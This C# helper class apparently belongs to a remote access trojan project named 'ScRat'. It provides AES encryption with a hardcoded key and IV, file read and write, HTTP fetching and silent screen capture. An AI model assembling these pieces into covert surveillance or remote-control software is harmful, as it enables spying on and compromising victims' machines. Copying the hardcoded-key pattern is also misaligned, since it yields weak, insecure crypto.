using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace ScRat.net
{
    class Helper
    {
        public static byte[] key = Convert.FromBase64String("FfWdKwgTkkfGsRUic9kXfBD3ofzUSgRFoQgGNGcVXOg=");
        public static byte[] vec = Convert.FromBase64String("UxvcXgNT5Vpq03n+2QAhKA==");
        public static byte[] encrypt(byte[] data)
        {
            Aes aesAlg = Aes.Create();
            aesAlg.Key = key;
            aesAlg.IV = vec;

            ICryptoTransform encryptor = aesAlg.CreateEncryptor();

            byte[] encryptedData;

            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                {
                    using (BinaryWriter sw = new BinaryWriter(cs))
                    {
                        sw.Write(data);
                    }
                    encryptedData = ms.ToArray();
                }
            }
            aesAlg.Dispose();
            return encryptedData;
        }
        public static byte[] decrypt(byte[] data)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = vec;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor();

                using (MemoryStream ms = new MemoryStream(data))
                {
                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    {
                        using (BinaryReader sr = new BinaryReader(cs))
                        {
                            using (MemoryStream m = new MemoryStream())
                            {
                                sr.BaseStream.CopyTo(m);
                                return m.ToArray();
                            }
                        }
                    }
                }
            }
        }
        public static bool writeFile(string path, byte[] data)
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(path));
                using (BinaryWriter writer = new BinaryWriter(File.OpenWrite(path)))
                {
                    writer.Write(data);
                    writer.Flush();
                }
                return true;
            }
            catch (Exception e)
            {
                Trace.WriteLine(e.ToString());
                return false;
            }
        }
        public static byte[] readFile(string path)
        {
            try
            {
                return File.ReadAllBytes(path);
            }
            catch (Exception e)
            {
                Trace.WriteLine(e.ToString());
                return null;
            }
        }
        public static string httpGet(string uri)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
                request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    return reader.ReadToEnd();
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static byte[] captureScreen(Size size)
        {
            try
            {
                Size screenSize = Screen.PrimaryScreen.Bounds.Size;
                if (size.Width != 0 && size.Height != 0) screenSize = size;
                Bitmap screenBitmap = new Bitmap(screenSize.Width, screenSize.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                Graphics screenGraphics = Graphics.FromImage(screenBitmap);
                screenGraphics.CopyFromScreen(0, 0, 0, 0, screenSize);
                using (MemoryStream imgStream = new MemoryStream())
                {
                    screenBitmap.Save(imgStream, System.Drawing.Imaging.ImageFormat.Png);
                    return imgStream.ToArray();
                }
            }
            catch (Exception)
            {
                return null;
            }
        }
    }
}
